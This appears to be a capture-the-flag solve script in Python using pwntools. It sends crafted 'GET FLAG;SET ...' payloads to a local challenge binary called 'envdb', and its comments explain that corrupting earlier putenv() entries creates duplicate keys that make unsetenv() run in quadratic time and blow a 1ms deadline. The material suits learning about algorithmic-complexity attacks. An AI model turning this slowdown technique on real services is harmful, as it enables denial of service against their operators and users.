# The per-operation deadline in the challenge is set to 1ms
# We get the flag if we manage to construct a single operation that takes more time than this.
# The intended solution is O(n^2) behavior in unsetenv() if we have many duplicate keys
# We can get duplicate keys by corruption of previous putenv()-entries.
# We can trigger unsetenv() by passing a string without '=' to putenv()

MAX_LINE = 3e6
N = (int(MAX_LINE) - 100) // 30

payload0 = "GET FLAG" + "\n"
payload1 = "GET FLAG" + "".join(f";SET {i:06d}=" for i in range(N)) + "\n"
payload2 = f"GET FLAG;SET {0:06d}=" + f"_____{0:06d}="*(N-1) + ";SET 000000" + "\n"

print(f"{payload0=}")
print(f"{payload1[:100]=}")
print(f"{payload2[:100]=}")

import pwn
p = pwn.process("./envdb", env={"FLAG":"SSM{testflag}"})
p.send(payload0.encode())
print("A", p.recv(timeout=1).decode())
p.send(payload1.encode())
print("B", p.recvline().decode())
p.send(payload2.encode())
print("C", p.recvall(timeout=3).decode())
